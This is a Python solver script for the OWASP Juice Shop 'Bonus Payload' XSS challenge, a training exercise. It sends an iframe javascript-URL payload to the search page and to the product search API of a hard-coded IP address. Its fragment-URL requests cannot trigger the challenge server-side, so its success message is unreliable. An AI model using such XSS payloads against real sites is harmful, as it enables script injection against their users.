#!/usr/bin/env python3
"""
OWASP Juice Shop - Bonus Payload XSS Challenge Solver
This challenge requires using the <iframe src="javascript:alert(`xss`)"> payload
"""

import requests
from urllib.parse import quote

BASE_URL = "http://155.138.197.128:5000"

def solve_bonus_payload_xss():
    """
    The Bonus Payload challenge is specifically solved by using the exact payload:
    <iframe src="javascript:alert(`xss`)">
    in the search functionality
    """
    
    session = requests.Session()
    
    print("🎯 Solving Bonus Payload XSS Challenge\n")
    print("="*50)
    
    # The specific payload that triggers the bonus challenge
    payload = '<iframe src="javascript:alert(`xss`)">'
    
    print(f"📝 Payload: {payload}")
    
    # Method 1: Direct URL navigation with search parameter
    search_url = f"{BASE_URL}/#/search?q={quote(payload)}"
    print(f"\n🔗 Accessing: {search_url}")
    
    try:
        # Make the request
        response = session.get(search_url)
        print("✅ Search request sent with XSS payload")
        
        # Also try the API endpoint directly
        api_url = f"{BASE_URL}/rest/products/search?q={quote(payload)}"
        response = session.get(api_url)
        print("✅ API request sent with XSS payload")
        
        # Try with different encoding
        response = session.get(f"{BASE_URL}/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E")
        print("✅ URL-encoded payload sent")
        
        print("\n" + "="*50)
        print("✨ Bonus Payload XSS challenge should be solved!")
        print(f"🏆 Check the score board: {BASE_URL}/#/score-board")
        print("\nNote: The challenge is triggered when the exact payload")
        print('<iframe src="javascript:alert(`xss`)"> is used in the search box.')
        print("You may need to manually paste this in the browser for it to execute.")
        
    except Exception as e:
        print(f"❌ Error: {e}")
    
    return search_url

if __name__ == "__main__":
    url = solve_bonus_payload_xss()
    print(f"\n💡 To manually trigger: Copy and paste this URL in your browser:")
    print(f"   {url}")